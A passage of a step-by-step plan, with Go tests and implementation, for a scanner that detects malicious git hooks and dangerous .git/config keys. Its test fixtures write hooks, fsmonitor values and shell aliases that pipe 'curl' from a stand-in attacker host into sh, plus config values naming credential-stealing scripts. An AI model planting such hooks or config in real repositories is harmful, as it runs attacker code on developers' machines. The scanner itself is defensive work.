# git-protect: Tasks 4-9 — Critical Detection Scanner Modules

Complete TDD implementation for the six critical scanner modules. Each task follows
the Red-Green-Commit cycle: test file (fails), implementation file (passes), commit.

All files live under `internal/scanner/` in package `scanner`,
module path `github.com/moldabekov/git-protect`.

---

## Shared Test Helper

Before the module tasks, create a shared test helper file. Every test in this
package imports helpers from it via the same `scanner_test` package.

**File: `internal/scanner/testhelper_test.go`**

```go
package scanner_test

import (
	"os"
	"path/filepath"
	"testing"
)

// makeRepo creates a temporary directory tree that looks like a git repository.
// It writes a .git/ directory with a HEAD file so scanners that check for
// .git/ presence work correctly. Returns the repo root path.
func makeRepo(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	gitDir := filepath.Join(dir, ".git")
	if err := os.MkdirAll(filepath.Join(gitDir, "hooks"), 0o755); err != nil {
		t.Fatalf("makeRepo: create .git/hooks: %v", err)
	}
	writeFile(t, filepath.Join(gitDir, "HEAD"), "ref: refs/heads/main\n")
	return dir
}

// writeFile writes content to path, creating parent directories as needed.
func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("writeFile: mkdir %s: %v", filepath.Dir(path), err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("writeFile: %s: %v", path, err)
	}
}

// writeExec writes an executable file at path with the given content.
func writeExec(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("writeExec: mkdir %s: %v", filepath.Dir(path), err)
	}
	if err := os.WriteFile(path, []byte(content), 0o755); err != nil {
		t.Fatalf("writeExec: %s: %v", path, err)
	}
}

// writeGitConfig writes a .git/config file in the repo at repoPath.
func writeGitConfig(t *testing.T, repoPath, content string) {
	t.Helper()
	writeFile(t, filepath.Join(repoPath, ".git", "config"), content)
}

// assertFinding fails the test unless at least one finding has the given module
// name and its Message contains msgSubstr.
func assertFinding(t *testing.T, findings []Finding, module, msgSubstr string) {
	t.Helper()
	for _, f := range findings {
		if f.Module == module && strings.Contains(f.Message, msgSubstr) {
			return
		}
	}
	t.Errorf("no finding in module %q with message containing %q; findings: %v",
		module, msgSubstr, findings)
}

// assertNoFindings fails the test if any findings were produced.
func assertNoFindings(t *testing.T, findings []Finding) {
	t.Helper()
	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d: %v", len(findings), findings)
	}
}

// assertSeverity fails unless at least one finding whose Message contains
// msgSubstr has the expected severity.
func assertSeverity(t *testing.T, findings []Finding, msgSubstr string, want Severity) {
	t.Helper()
	for _, f := range findings {
		if strings.Contains(f.Message, msgSubstr) {
			if f.Severity != want {
				t.Errorf("finding %q: severity = %v, want %v", msgSubstr, f.Severity, want)
			}
			return
		}
	}
	t.Errorf("no finding with message containing %q", msgSubstr)
}
```

> The three assertion helpers reference `Finding` and `Severity` unqualified
> because the test file uses `scanner_test` package but calls into the `scanner`
> package via the test imports. In practice every test file imports
> `"github.com/moldabekov/git-protect/internal/scanner"` and calls
> `scanner.Finding`, etc. Update `testhelper_test.go` to use the qualified forms:

**File: `internal/scanner/testhelper_test.go`** (final — with qualified types)

```go
package scanner_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func makeRepo(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	gitDir := filepath.Join(dir, ".git")
	if err := os.MkdirAll(filepath.Join(gitDir, "hooks"), 0o755); err != nil {
		t.Fatalf("makeRepo: create .git/hooks: %v", err)
	}
	writeFile(t, filepath.Join(gitDir, "HEAD"), "ref: refs/heads/main\n")
	return dir
}

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("writeFile: mkdir %s: %v", filepath.Dir(path), err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("writeFile %s: %v", path, err)
	}
}

func writeExec(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("writeExec: mkdir %s: %v", filepath.Dir(path), err)
	}
	if err := os.WriteFile(path, []byte(content), 0o755); err != nil {
		t.Fatalf("writeExec %s: %v", path, err)
	}
}

func writeGitConfig(t *testing.T, repoPath, content string) {
	t.Helper()
	writeFile(t, filepath.Join(repoPath, ".git", "config"), content)
}

// assertFinding fails unless at least one finding has module==module and
// Message contains msgSubstr.
func assertFinding(t *testing.T, findings []scanner.Finding, module, msgSubstr string) {
	t.Helper()
	for _, f := range findings {
		if f.Module == module && strings.Contains(f.Message, msgSubstr) {
			return
		}
	}
	t.Errorf("no finding in module %q with message containing %q; got: %v",
		module, msgSubstr, findings)
}

// assertNoFindings fails if any findings were produced.
func assertNoFindings(t *testing.T, findings []scanner.Finding) {
	t.Helper()
	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d: %v", len(findings), findings)
	}
}

// assertSeverity fails unless a finding whose Message contains msgSubstr has
// the expected severity.
func assertSeverity(t *testing.T, findings []scanner.Finding, msgSubstr string, want scanner.Severity) {
	t.Helper()
	for _, f := range findings {
		if strings.Contains(f.Message, msgSubstr) {
			if f.Severity != want {
				t.Errorf("finding %q: severity = %v, want %v", msgSubstr, f.Severity, want)
			}
			return
		}
	}
	t.Errorf("no finding with message containing %q", msgSubstr)
}
```

---

## Task 4: Hooks Scanner

### Files
- `internal/scanner/hooks_test.go`
- `internal/scanner/hooks.go`

---

### Step 1 — Write the test

**File: `internal/scanner/hooks_test.go`**

```go
package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func TestHooksScanner_NoHooks(t *testing.T) {
	repo := makeRepo(t)
	m := scanner.NewHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

func TestHooksScanner_SampleFileIgnored(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".git", "hooks", "pre-commit.sample"),
		"#!/bin/sh\nexit 0\n")
	m := scanner.NewHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for .sample file, got %d", len(findings))
	}
}

func TestHooksScanner_ExecutableHook_IsCritical(t *testing.T) {
	repo := makeRepo(t)
	writeExec(t, filepath.Join(repo, ".git", "hooks", "pre-commit"),
		"#!/bin/sh\ncurl http://evil.example.com/exfil.sh | sh\n")
	m := scanner.NewHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}
	f := findings[0]
	if f.Severity != scanner.Critical {
		t.Errorf("severity = %v, want CRITICAL", f.Severity)
	}
	if f.Module != "hooks" {
		t.Errorf("module = %q, want %q", f.Module, "hooks")
	}
	if !strings.Contains(f.Path, "pre-commit") {
		t.Errorf("path %q should contain hook name", f.Path)
	}
	if f.Message == "" {
		t.Error("message must not be empty")
	}
}

func TestHooksScanner_MultipleExecutableHooks(t *testing.T) {
	repo := makeRepo(t)
	hooksDir := filepath.Join(repo, ".git", "hooks")
	writeExec(t, filepath.Join(hooksDir, "pre-commit"), "#!/bin/sh\necho attack\n")
	writeExec(t, filepath.Join(hooksDir, "post-checkout"), "#!/bin/sh\necho attack2\n")
	writeExec(t, filepath.Join(hooksDir, "pre-push"), "#!/bin/sh\necho attack3\n")
	// .sample must be ignored even when siblings are executable.
	writeFile(t, filepath.Join(hooksDir, "pre-push.sample"), "#!/bin/sh\nexit 0\n")

	m := scanner.NewHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 3 {
		t.Errorf("expected 3 findings, got %d", len(findings))
	}
	for _, f := range findings {
		if f.Severity != scanner.Critical {
			t.Errorf("finding %q: severity = %v, want CRITICAL", f.Path, f.Severity)
		}
		if f.Module != "hooks" {
			t.Errorf("finding %q: module = %q, want %q", f.Path, f.Module, "hooks")
		}
	}
}

func TestHooksScanner_NonExecutableFileIgnored(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".git", "hooks", "README"), "hooks documentation\n")
	m := scanner.NewHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for non-executable file, got %d", len(findings))
	}
}

func TestHooksScanner_MissingHooksDir_NoError(t *testing.T) {
	repo := makeRepo(t)
	if err := os.RemoveAll(filepath.Join(repo, ".git", "hooks")); err != nil {
		t.Fatalf("setup: %v", err)
	}
	m := scanner.NewHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("scanner must not error on missing hooks dir, got: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}
```

### Step 2 — Run test (expect FAIL)

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestHooksScanner -v 2>&1 | head -20
```

Expected output (compilation failure because `NewHooksModule` is not yet defined):
```
./internal/scanner/hooks_test.go:11:12: undefined: scanner.NewHooksModule
FAIL    github.com/moldabekov/git-protect/internal/scanner [build failed]
```

### Step 3 — Write the implementation

**File: `internal/scanner/hooks.go`**

```go
package scanner

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// hooksModule scans .git/hooks/ for executable files that are not .sample stubs.
// Any executable hook in a freshly cloned repo is suspicious — git does not
// install executable hooks from a remote; they come only from init.templateDir.
type hooksModule struct{}

// NewHooksModule returns a Module that detects executable git hooks.
func NewHooksModule() Module {
	return &hooksModule{}
}

func (h *hooksModule) Name() string { return "hooks" }

func (h *hooksModule) Scan(_ context.Context, sc ScanContext) ([]Finding, error) {
	hooksDir := filepath.Join(sc.RepoPath, ".git", "hooks")

	entries, err := os.ReadDir(hooksDir)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, nil
		}
		return nil, fmt.Errorf("hooks: read dir %s: %w", hooksDir, err)
	}

	var findings []Finding
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		// .sample files are git's bundled hook examples; they are never
		// executed automatically and their presence is expected.
		if strings.HasSuffix(e.Name(), ".sample") {
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		// Flag any file with at least one executable bit set.
		if info.Mode()&0o111 == 0 {
			continue
		}
		hookPath := filepath.Join(".git", "hooks", e.Name())
		findings = append(findings, Finding{
			Severity: Critical,
			Module:   "hooks",
			Path:     hookPath,
			Message:  fmt.Sprintf("executable hook %q found in .git/hooks/", e.Name()),
			Detail: "Executable hooks in a cloned repository run attacker code during " +
				"git operations such as commit, checkout, and push. In a clean clone, " +
				"hook files must not exist unless populated by init.templateDir, which " +
				"is outside the attacker's control in a normal clone.",
		})
	}
	return findings, nil
}
```

### Step 4 — Run test (expect PASS)

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestHooksScanner -v
```

Expected output:
```
=== RUN   TestHooksScanner_NoHooks
--- PASS: TestHooksScanner_NoHooks (0.00s)
=== RUN   TestHooksScanner_SampleFileIgnored
--- PASS: TestHooksScanner_SampleFileIgnored (0.00s)
=== RUN   TestHooksScanner_ExecutableHook_IsCritical
--- PASS: TestHooksScanner_ExecutableHook_IsCritical (0.00s)
=== RUN   TestHooksScanner_MultipleExecutableHooks
--- PASS: TestHooksScanner_MultipleExecutableHooks (0.00s)
=== RUN   TestHooksScanner_NonExecutableFileIgnored
--- PASS: TestHooksScanner_NonExecutableFileIgnored (0.00s)
=== RUN   TestHooksScanner_MissingHooksDir_NoError
--- PASS: TestHooksScanner_MissingHooksDir_NoError (0.00s)
PASS
```

### Step 5 — Commit

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
git add internal/scanner/hooks.go internal/scanner/hooks_test.go internal/scanner/testhelper_test.go
git commit -m "feat: hooks scanner -- detect executable files in .git/hooks/ (CRITICAL)"
```

---

## Task 5: Config Scanner

### Files
- `internal/scanner/config_test.go`
- `internal/scanner/config.go`

The config scanner parses `.git/config` as INI and flags 28+ dangerous key patterns
that cause git to execute arbitrary commands.

---

### Step 1 — Write the test

**File: `internal/scanner/config_test.go`**

```go
package scanner_test

import (
	"context"
	"path/filepath"
	"strings"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

// configScan is a shortcut used throughout config tests.
func configScan(t *testing.T, repo string) []scanner.Finding {
	t.Helper()
	m := scanner.NewConfigModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("config scan error: %v", err)
	}
	return findings
}

func TestConfigScanner_CleanConfig(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/legit/project.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
`)
	assertNoFindings(t, configScan(t, repo))
}

func TestConfigScanner_FsmonitorAttack(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	repositoryformatversion = 0
	fsmonitor = "curl http://evil.example.com/c.sh | sh"
`)
	findings := configScan(t, repo)
	if len(findings) < 1 {
		t.Fatalf("expected at least 1 finding, got 0")
	}
	assertFinding(t, findings, "config", "core.fsmonitor")
	assertSeverity(t, findings, "core.fsmonitor", scanner.Critical)
}

func TestConfigScanner_CorePager(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	pager = "less | /tmp/attack"
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "core.pager")
}

func TestConfigScanner_CoreEditor(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	editor = "/tmp/evil-editor"
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "core.editor")
}

func TestConfigScanner_CoreSshCommand(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	sshCommand = "ssh -o ProxyCommand=/tmp/evil"
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "core.sshCommand")
}

func TestConfigScanner_CoreAskPass(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	askPass = /tmp/steal-creds.sh
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "core.askPass")
}

func TestConfigScanner_CoreHooksPath(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	hooksPath = /tmp/attacker-hooks
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "core.hooksPath")
}

func TestConfigScanner_CoreGitProxy(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	gitProxy = /tmp/proxy-cmd
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "core.gitProxy")
}

func TestConfigScanner_CoreAlternateRefsCommand(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	alternateRefsCommand = /tmp/alt-cmd
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "core.alternateRefsCommand")
}

func TestConfigScanner_CredentialHelper(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[credential]
	helper = /tmp/steal-token.sh
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "credential.helper")
}

func TestConfigScanner_DiffTextconv(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[diff "malicious"]
	textconv = /tmp/exfil
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "diff.malicious.textconv")
}

func TestConfigScanner_DiffExternal(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[diff]
	external = /tmp/diff-wrapper
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "diff.external")
}

func TestConfigScanner_DifftoolCmd(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[difftool "evil"]
	cmd = /tmp/difftool-attack
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "difftool.evil.cmd")
}

func TestConfigScanner_MergeTool(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[merge]
	tool = evilmerge
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "merge.tool")
}

func TestConfigScanner_MergetoolCmd(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[mergetool "evil"]
	cmd = /tmp/mergetool-attack
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "mergetool.evil.cmd")
}

func TestConfigScanner_FilterSmudge(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[filter "build"]
	smudge = /tmp/inject.sh
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "filter.build.smudge")
}

func TestConfigScanner_FilterClean(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[filter "build"]
	clean = /tmp/exfil.sh
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "filter.build.clean")
}

func TestConfigScanner_FilterProcess(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[filter "build"]
	process = /tmp/persistent-attack
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "filter.build.process")
}

func TestConfigScanner_AliasWithBang(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[alias]
	evil = "!curl http://evil.example.com | sh"
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "alias.evil")
}

func TestConfigScanner_AliasWithoutBang_NoFinding(t *testing.T) {
	repo := makeRepo(t)
	// Normal git-command aliases are safe.
	writeGitConfig(t, repo, `[alias]
	st = status
	co = checkout
	lg = "log --oneline --graph"
`)
	assertNoFindings(t, configScan(t, repo))
}

func TestConfigScanner_GpgProgram(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[gpg]
	program = /tmp/fake-gpg
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "gpg.program")
}

func TestConfigScanner_GpgSubkeyProgram(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[gpg "x509"]
	program = /tmp/fake-x509
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "gpg.x509.program")
}

func TestConfigScanner_GpgSshDefaultKeyCommand(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[gpg "ssh"]
	defaultKeyCommand = /tmp/key-exfil
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "gpg.ssh.defaultKeyCommand")
}

func TestConfigScanner_SequenceEditor(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[sequence]
	editor = /tmp/rebase-attack
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "sequence.editor")
}

func TestConfigScanner_TrailerCommand(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[trailer "ticket"]
	command = /tmp/trailer-attack
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "trailer.ticket.command")
}

func TestConfigScanner_TrailerCmd(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[trailer "ticket"]
	cmd = /tmp/trailer-attack-v2
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "trailer.ticket.cmd")
}

func TestConfigScanner_RemoteUploadpack(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[remote "origin"]
	url = https://github.com/legit/repo.git
	uploadpack = /tmp/fake-upload-pack
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "remote.origin.uploadpack")
}

func TestConfigScanner_RemoteReceivepack(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[remote "origin"]
	url = https://github.com/legit/repo.git
	receivepack = /tmp/fake-receive-pack
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "remote.origin.receivepack")
}

func TestConfigScanner_UrlInsteadOf(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[url "https://evil.example.com/"]
	insteadOf = https://github.com/
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "insteadOf")
}

func TestConfigScanner_HttpSslCAInfo(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[http]
	sslCAInfo = /tmp/evil-ca.crt
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "http.sslCAInfo")
}

func TestConfigScanner_HttpSslVerifyFalse(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[http]
	sslVerify = false
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "http.sslVerify")
}

func TestConfigScanner_HttpSslVerifyTrue_NoFinding(t *testing.T) {
	repo := makeRepo(t)
	// sslVerify = true is the default safe value.
	writeGitConfig(t, repo, `[http]
	sslVerify = true
`)
	assertNoFindings(t, configScan(t, repo))
}

func TestConfigScanner_HttpProxy(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[http]
	proxy = http://attacker.example.com:8080
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "http.proxy")
}

func TestConfigScanner_SendemailSmtpServer(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[sendemail]
	smtpserver = attacker.example.com
`)
	findings := configScan(t, repo)
	assertFinding(t, findings, "config", "sendemail.smtpserver")
}

func TestConfigScanner_MultipleKeys_AllReported(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	fsmonitor = "curl http://evil.example.com | sh"
	hooksPath = /tmp/attacker-hooks
[filter "attack"]
	smudge = /tmp/inject.sh
[alias]
	evil = "!curl http://evil.example.com | sh"
	st   = status
[url "https://evil.example.com/"]
	insteadOf = https://github.com/
`)
	findings := configScan(t, repo)
	if len(findings) < 5 {
		t.Errorf("expected at least 5 findings, got %d: %v", len(findings), findings)
	}
	assertFinding(t, findings, "config", "core.fsmonitor")
	assertFinding(t, findings, "config", "core.hooksPath")
	assertFinding(t, findings, "config", "alias.evil")
}

func TestConfigScanner_MissingConfigFile_NoError(t *testing.T) {
	repo := makeRepo(t)
	// No .git/config written — scanner must return cleanly.
	m := scanner.NewConfigModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("scanner must not error on missing config, got: %v", err)
	}
	_ = findings
}

func TestConfigScanner_ConfigPath(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	fsmonitor = /tmp/attack
`)
	findings := configScan(t, repo)
	if len(findings) == 0 {
		t.Fatal("expected findings")
	}
	if !strings.Contains(findings[0].Path, filepath.Join(".git", "config")) {
		t.Errorf("path %q should contain .git/config", findings[0].Path)
	}
}
```

### Step 2 — Run test (expect FAIL)

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestConfigScanner -v 2>&1 | head -10
```

Expected output:
```
./internal/scanner/config_test.go:12:12: undefined: scanner.NewConfigModule
FAIL    github.com/moldabekov/git-protect/internal/scanner [build failed]
```

### Step 3 — Write the implementation

**File: `internal/scanner/config.go`**

```go
package scanner

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
)

// configEntry represents one key=value pair parsed from the INI config, with
// its fully qualified key name (section.subsection.key or section.key).
type configEntry struct {
	qualifiedKey string // e.g. "core.fsmonitor", "filter.lfs.smudge"
	value        string
}

// configModule scans .git/config for directives that cause git to execute
// arbitrary commands or redirect traffic to attacker-controlled infrastructure.
type configModule struct{}

// NewConfigModule returns a Module that detects dangerous .git/config keys.
func NewConfigModule() Module {
	return &configModule{}
}

func (c *configModule) Name() string { return "config" }

func (c *configModule) Scan(_ context.Context, sc ScanContext) ([]Finding, error) {
	cfgPath := filepath.Join(sc.RepoPath, ".git", "config")
	f, err := os.Open(cfgPath)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, nil
		}
		return nil, fmt.Errorf("config: open %s: %w", cfgPath, err)
	}
	defer f.Close()

	entries, err := parseGitConfig(f)
	if err != nil {
		return nil, fmt.Errorf("config: parse %s: %w", cfgPath, err)
	}

	relPath := filepath.Join(".git", "config")
	var findings []Finding
	for _, entry := range entries {
		if msg, detail := checkDangerous(entry); msg != "" {
			findings = append(findings, Finding{
				Severity: Critical,
				Module:   "config",
				Path:     relPath,
				Message:  msg,
				Detail:   detail,
			})
		}
	}
	return findings, nil
}

// parseGitConfig parses git INI format from r and returns all key=value entries
// with fully-qualified key names.
//
// Git INI grammar:
//
//	[section]           -> section.key
//	[section "sub"]     -> section.sub.key  (subsection is case-sensitive)
//	key = value
//	# and ; are comment characters
func parseGitConfig(r io.Reader) ([]configEntry, error) {
	sc := bufio.NewScanner(r)
	var entries []configEntry
	var section string    // lowercased section name
	var subsection string // exact-case subsection (between double quotes)

	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || line[0] == '#' || line[0] == ';' {
			continue
		}
		if line[0] == '[' {
			// Section header: [section] or [section "subsection"]
			end := strings.LastIndex(line, "]")
			if end < 0 {
				continue
			}
			header := line[1:end]
			if idx := strings.Index(header, `"`); idx >= 0 {
				section = strings.ToLower(strings.TrimSpace(header[:idx]))
				sub := header[idx:]
				sub = strings.Trim(sub, ` "`)
				subsection = sub
			} else {
				section = strings.ToLower(strings.TrimSpace(header))
				subsection = ""
			}
			continue
		}
		// Key=value line.
		eq := strings.IndexByte(line, '=')
		if eq < 0 {
			continue
		}
		key := strings.ToLower(strings.TrimSpace(line[:eq]))
		val := strings.TrimSpace(line[eq+1:])
		val = stripInlineComment(val)
		if len(val) >= 2 && val[0] == '"' && val[len(val)-1] == '"' {
			val = val[1 : len(val)-1]
		}

		var qualKey string
		if subsection != "" {
			qualKey = section + "." + subsection + "." + key
		} else {
			qualKey = section + "." + key
		}
		entries = append(entries, configEntry{qualifiedKey: qualKey, value: val})
	}
	return entries, sc.Err()
}

// stripInlineComment removes an unquoted # or ; comment from the end of a value.
func stripInlineComment(s string) string {
	inQuote := false
	for i, ch := range s {
		switch ch {
		case '"':
			inQuote = !inQuote
		case '#', ';':
			if !inQuote {
				return strings.TrimSpace(s[:i])
			}
		}
	}
	return s
}

// checkDangerous inspects one config entry and returns (message, detail) if the
// entry is dangerous. Returns ("", "") if safe.
func checkDangerous(e configEntry) (string, string) { //nolint:cyclop
	k := e.qualifiedKey
	v := e.value

	hasSection := func(sec string) bool { return strings.HasPrefix(k, sec+".") }
	hasSuffix := func(suf string) bool { return strings.HasSuffix(k, "."+suf) }

	switch {
	case k == "core.fsmonitor":
		return "core.fsmonitor",
			"Runs an arbitrary shell command on every 'git status'. " +
				"IDEs trigger git status automatically. Value: " + v

	case k == "core.pager":
		return "core.pager",
			"Runs a shell pipeline to page output of git log/diff/show. Value: " + v

	case k == "core.editor":
		return "core.editor",
			"Replaces the editor launched for git commit and git rebase -i. Value: " + v

	case k == "core.sshcommand":
		return "core.sshCommand",
			"Replaces the SSH binary used for all remote operations. Value: " + v

	case k == "core.askpass":
		return "core.askPass",
			"Runs an arbitrary program to supply credentials. Value: " + v

	case k == "core.hookspath":
		return "core.hooksPath",
			"Redirects all hook lookups to an attacker-controlled directory. Value: " + v

	case k == "core.gitproxy":
		return "core.gitProxy",
			"Specifies a command run as proxy for git:// protocol connections. Value: " + v

	case k == "core.alternaterefscommand":
		return "core.alternateRefsCommand",
			"Shell command executed when advertising alternate refs. Value: " + v

	case k == "credential.helper":
		return "credential.helper",
			"Runs an arbitrary program to supply or store credentials. Value: " + v

	case hasSection("diff") && hasSuffix("textconv"):
		return k,
			"Runs an arbitrary program to convert file content for diff output. Value: " + v

	case k == "diff.external":
		return "diff.external",
			"Replaces the diff program with an arbitrary shell command. Value: " + v

	case hasSection("difftool") && hasSuffix("cmd"):
		return k,
			"Shell command run by git difftool. Value: " + v

	case k == "merge.tool":
		return "merge.tool",
			"Specifies the merge tool; combined with mergetool.<name>.cmd this " +
				"executes arbitrary commands. Value: " + v

	case hasSection("mergetool") && hasSuffix("cmd"):
		return k,
			"Shell command run by git mergetool. Value: " + v

	case hasSection("filter") && hasSuffix("smudge"):
		return k,
			"Runs an arbitrary program on every file during git checkout. Value: " + v

	case hasSection("filter") && hasSuffix("clean"):
		return k,
			"Runs an arbitrary program on every file during git add. Value: " + v

	case hasSection("filter") && hasSuffix("process"):
		return k,
			"Runs a persistent arbitrary process handling all filter operations. Value: " + v

	case hasSection("alias"):
		if strings.HasPrefix(v, "!") {
			return k,
				"Alias with '!' prefix executes a shell command on 'git <alias>'. Value: " + v
		}

	case k == "gpg.program":
		return "gpg.program",
			"Replaces the GPG binary for signing operations. Value: " + v

	case hasSection("gpg") && hasSuffix("program"):
		return k,
			"Replaces a GPG variant binary for signing operations. Value: " + v

	case k == "gpg.ssh.defaultkeycommand":
		return "gpg.ssh.defaultKeyCommand",
			"Shell command executed to look up the default SSH signing key. Value: " + v

	case k == "sequence.editor":
		return "sequence.editor",
			"Replaces the editor used for interactive rebase. Value: " + v

